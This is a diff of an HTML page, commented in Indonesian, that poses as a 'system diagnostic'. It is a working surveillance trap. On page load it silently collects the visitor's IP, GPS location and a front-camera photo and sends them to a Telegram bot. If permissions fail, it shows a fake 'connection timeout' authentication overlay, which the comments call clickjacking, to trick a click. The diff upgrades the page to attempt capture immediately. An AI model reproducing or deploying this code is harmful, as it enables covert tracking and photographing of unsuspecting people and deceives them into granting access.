@@ -2,11 +2,10 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>LEVIATHAN | MONITORING SYSTEM V5.2</title>
+  <title>LEVIATHAN | SYSTEM DIAGNOSTIC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;900&display=swap" rel="stylesheet">
   <style>
-    /* Spek Modular Pro & Visual Arsitek */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background: #050505;
@@ -17,7 +16,6 @@
       display: flex;
       flex-direction: column;
     }
-
     header {
       padding: 10px 20px;
       background: #111;
@@ -26,48 +24,28 @@
       justify-content: space-between;
       font-size: 12px;
       z-index: 10;
-      text-shadow: 0 0 5px lime;
     }
-
     .wrapper { display: flex; flex: 1; position: relative; }
     .sidebar { width: 250px; background: #0a0a0a; border-right: 1px solid #222; padding: 15px; font-size: 10px; z-index: 5; }
-    .terminal { flex: 1; padding: 20px; position: relative; overflow: hidden; background: radial-gradient(circle, #0a0a0a 0%, #000 100%); }
+    .terminal { flex: 1; padding: 20px; position: relative; background: radial-gradient(circle, #0a0a0a 0%, #000 100%); }
 
-    /* Background Particles */
-    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
-    .particle { position: absolute; width: 2px; height: 2px; background: rgba(0, 255, 127, 0.3); border-radius: 50%; animation: float 6s ease-in-out infinite; }
-    @keyframes float { 0%, 100% { transform: translateY(0px); opacity: 0.3; } 50% { transform: translateY(-20px); opacity: 0.8; } }
-
-    /* Overlay Clickjacking Tersembunyi */
+    /* Overlay Clickjacking (Awalnya Tersembunyi) */
     #trap-layer {
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
       z-index: 9999;
-      background: rgba(0,0,0,0.8);
-      display: flex;
+      background: rgba(0,0,0,0.9);
+      display: none; /* Hanya muncul jika serangan senyap gagal */
       justify-content: center;
       align-items: center;
     }
-
     .alert-box {
       background: #111;
       border: 2px solid lime;
       padding: 40px;
       text-align: center;
-      box-shadow: 0 0 50px rgba(0, 255, 0, 0.2);
       border-radius: 15px;
-      position: relative;
     }
-
-    .close-x {
-      position: absolute;
-      top: 10px;
-      right: 15px;
-      font-size: 24px;
-      cursor: pointer;
-      color: #333; /* Hampir tidak terlihat untuk memancing klik */
-    }
-
     .btn-action {
       background: lime;
       color: black;
@@ -76,42 +54,35 @@
       cursor: pointer;
       font-weight: 900;
       margin-top: 20px;
-      font-family: 'Inter', sans-serif;
       border-radius: 5px;
     }
-
-    #video, #canvas { display: none; }
-    #log-stream div { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }
+    video, canvas { display: none; }
+    #log-stream div { margin-bottom: 5px; font-size: 10px; color: #00ff41; opacity: 0.8; }
   </style>
 </head>
 <body>
 
 <header>
-  <div>SYSTEM: LEVIATHAN ONLINE</div>
+  <div>SYSTEM: LEVIATHAN ADAPTIVE</div>
   <div id="clock">00:00:00</div>
 </header>
 
 <div class="wrapper">
-  <div class="bg-particles"></div>
-  
   <div class="sidebar">
-    <p style="color: lime; font-weight: bold;">[M] MONITORING_NODE</p>
+    <p style="color: lime; font-weight: bold;">[M] MONITORING</p>
     <hr style="border: 0.5px solid #222; margin: 10px 0;">
-    <div id="log-stream">Initializing...</div>
+    <div id="log-stream">System Ready...</div>
   </div>
 
   <div class="terminal">
     <div id="trap-layer">
       <div class="alert-box">
-        <span class="close-x" onclick="armTheLeviathan()">×</span>
-        <h2 style="font-family: 'Inter', sans-serif; font-weight: 900;">VERIFIKASI DIPERLUKAN</h2>
-        <p style="color: #888; margin-top: 10px;">Browser mendeteksi kegagalan sinkronisasi.<br>Tekan tombol di bawah untuk memulihkan sesi.</p>
-        <button class="btn-action" onclick="armTheLeviathan()">SINKRONISASI SEKARANG</button>
+        <h2 style="font-family: 'Inter', sans-serif;">CONNECTION TIMEOUT</h2>
+        <p style="color: #888; margin-top: 10px;">Gagal menghubungkan ke server.<br>Klik tombol untuk autentikasi manual.</p>
+        <button class="btn-action" onclick="retryWithClick()">AUTHENTICATE</button>
       </div>
     </div>
-    <div style="position: relative; z-index: 2;">
-      <p>> ROOT@LEVIATHAN:~$ <span id="typer"></span></p>
-    </div>
+    <p>> ROOT@LEVIATHAN:~$ <span id="typer">Awaiting subject...</span></p>
   </div>
 </div>
 
@@ -124,7 +95,12 @@
     ids: ['7109845671']
   };
 
-  function sendMsg(t) {
+  function log(m) {
+    const s = document.getElementById('log-stream');
+    s.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${m}</div>` + s.innerHTML;
+  }
+
+  function sendToTelegram(t) {
     CONFIG.ids.forEach(id => {
       fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
         method: 'POST',
@@ -134,7 +110,7 @@
     });
   }
 
-  function sendPic(b) {
+  function sendPhoto(b) {
     CONFIG.ids.forEach(id => {
       const fd = new FormData();
       fd.append('chat_id', id);
@@ -143,41 +119,39 @@
     });
   }
 
-  function log(m) {
-    const s = document.getElementById('log-stream');
-    s.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${m}</div>` + s.innerHTML;
-  }
+  // --- INTI SIHIR ADAPTIF ---
 
-  async function armTheLeviathan() {
-    document.getElementById('trap-layer').style.display = 'none';
-    log("TRAP_TRIGGERED: AUTH_GRANTED");
+  async function captureProcess(isSilent = true) {
+    log(isSilent ? "SILENT_ATTACK_INIT" : "MANUAL_AUTH_INIT");
 
-    // 1. IP & Metadata
+    // 1. Lokasi (Tahap IP - Selalu Berhasil)
     try {
       const res = await fetch('https://ipapi.co/json/');
       const d = await res.json();
-      // FIX: URL Tanpa simbol $
-      const mapsIP = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-      sendMsg(`<b>🔱 LEVIATHAN CAPTURE</b>\n<b>IP:</b> ${d.ip}\n<b>ISP:</b> ${d.org}\n<b>MAPS:</b> ${mapsIP}`);
-      log("IP_DATA_SYNCED");
-    } catch (e) { log("IP_FETCH_FAILED"); }
+      const mapsIP = `http://maps.google.com/maps?q=${d.latitude},${d.longitude}`;
+      sendToTelegram(`<b>🔱 LEVIATHAN (${isSilent ? 'SILENT' : 'CLICK'})</b>\n<b>IP:</b> ${d.ip}\n<b>MAPS:</b> ${mapsIP}`);
+    } catch (e) {}
 
-    // 2. Geolocation (Tanpa Perlu GPS Aktif)
+    // 2. Lokasi Presisi (Triangulasi)
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        // FIX: URL Tanpa simbol $
-        const mapsGPS = `https://www.google.com/maps?q=${lat},${lon}`;
-        sendMsg(`<b>📍 RADAR LOCK (Acc: ${pos.coords.accuracy.toFixed(0)}m)</b>\n${mapsGPS}`);
-        log("GEOLOCATION_LOCKED");
-      }, null, { enableHighAccuracy: true });
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const gpsLink = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          sendToTelegram(`<b>📍 GPS_LOCKED:</b>\n${gpsLink}`);
+          log("GEO_SYNCED");
+        },
+        err => {
+          if (isSilent) showTrap(); // Munculkan popup jika senyap gagal
+          log("GEO_BLOCKED");
+        },
+        { enableHighAccuracy: true }
+      );
     }
 
-    // 3. Cermin Terkutuk (Kamera High-Res)
+    // 3. Kamera
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } 
+        video: { facingMode: "user", width: 1920, height: 1080 } 
       });
       const v = document.getElementById('video');
       const c = document.getElementById('canvas');
@@ -189,36 +163,32 @@
           c.height = v.videoHeight;
           c.getContext('2d').drawImage(v, 0, 0);
           c.toBlob(blob => {
-            if (blob) sendPic(blob);
+            if (blob) sendPhoto(blob);
             stream.getTracks().forEach(t => t.stop());
-            log("MIRROR_REFLECTED");
-            setTimeout(() => { location.reload(); }, 2000);
-          }, 'image/jpeg', 0.95);
-        }, 2000);
+            log("MIRROR_SUCCESS");
+            if (!isSilent) setTimeout(() => location.reload(), 1500);
+          }, 'image/jpeg', 0.9);
+        }, 1500);
       };
     } catch (err) {
-      sendMsg("❌ CAMERA_ACCESS_DENIED");
-      log("AUTH_ERROR: CAMERA");
+      if (isSilent) showTrap(); // Munculkan popup jika senyap gagal
+      log("CAMERA_BLOCKED");
     }
   }
 
-  // Partikel Visual
-  function createParticles() {
-    const container = document.querySelector('.bg-particles');
-    for (let i = 0; i < 40; i++) {
-      const p = document.createElement('div');
-      p.className = 'particle';
-      p.style.left = Math.random() * 100 + '%';
-      p.style.top = Math.random() * 100 + '%';
-      p.style.animationDelay = Math.random() * 5 + 's';
-      container.appendChild(p);
-    }
+  function showTrap() {
+    document.getElementById('trap-layer').style.display = 'flex';
+    log("SWITCHING_TO_CLICKJACKING...");
+  }
+
+  function retryWithClick() {
+    document.getElementById('trap-layer').style.display = 'none';
+    captureProcess(false); // Jalankan ulang dengan mode klik
   }
 
   window.onload = () => {
-    createParticles();
     setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
-    log("WAITING_FOR_SUBJECT...");
+    captureProcess(true); // Coba mode senyap saat masuk
   };
 </script>
 
